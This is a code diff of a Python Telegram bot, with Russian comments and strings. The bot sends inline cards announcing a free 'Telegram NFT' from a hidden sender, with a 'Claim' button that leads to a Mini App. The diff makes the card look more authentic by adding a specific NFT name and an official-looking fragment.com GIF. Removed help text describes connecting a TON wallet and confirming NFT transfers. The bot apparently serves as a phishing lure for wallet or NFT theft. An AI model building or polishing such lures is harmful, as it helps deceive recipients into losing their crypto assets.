@@ -62,15 +62,20 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Обрабатывает inline запросы - показывает красивую карточку с GIF"""
-    query = update.inline_query.query
     user_id = update.inline_query.from_user.id
 
     # Ссылка на Mini App
     mini_app_link = f"https://t.me/{BOT_USERNAME}/{APP_SHORT_NAME}?startapp={user_id}"
 
+    # TODO: Заменить на реальное название NFT и номер
+    nft_name = "Lol Pop #130400"
+
+    # TODO: Заменить на публичный URL GIF (загрузи на imgur.com)
+    gif_url = "https://nft.fragment.com/telegram.gif"
+
     # Создаём красивую карточку с кнопкой
     keyboard = [
-        [InlineKeyboardButton("🎁 Забрать NFT", url=mini_app_link)]
+        [InlineKeyboardButton("Забрать", url=mini_app_link)]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
@@ -79,13 +84,12 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
         InlineQueryResultArticle(
             id="nft_gift",
             title="🎁 Отправить Telegram NFT",
-            description="Получатель сможет забрать все NFT одной кнопкой",
-            thumbnail_url="https://nft.fragment.com/telegram.gif",
+            description="Получатель сможет забрать NFT одной кнопкой",
+            thumbnail_url=gif_url,
             input_message_content=InputTextMessageContent(
                 message_text=(
-                    "🎁 **Вам отправлен Telegram NFT**\n\n"
-                    "От: **Аккаунт скрыт**\n\n"
-                    "Нажмите кнопку ниже чтобы забрать NFT!"
+                    f"Вам отправлен Telegram NFT: **{nft_name}**\n\n"
+                    f"От: **Аккаунт скрыт**"
                 ),
                 parse_mode='Markdown'
             ),
@@ -94,16 +98,6 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
 
     await update.inline_query.answer(results, cache_time=1)
-        "3. На том аккаунте открываешь Mini App\n"
-        "4. Подключаешь TON кошелёк\n"
-        "5. Видишь все свои Telegram NFT\n"
-        "6. Нажимаешь 'Отправить' на нужном NFT\n"
-        "7. Подтверждаешь транзакцию\n"
-        "8. NFT переходит на основной аккаунт\n\n"
-        "💎 Работает только с Telegram NFT на TON блокчейне"
-    )
-
-    await update.message.reply_text(help_text, parse_mode='Markdown')
 
 def main():
     logger.info("Запуск бота...")
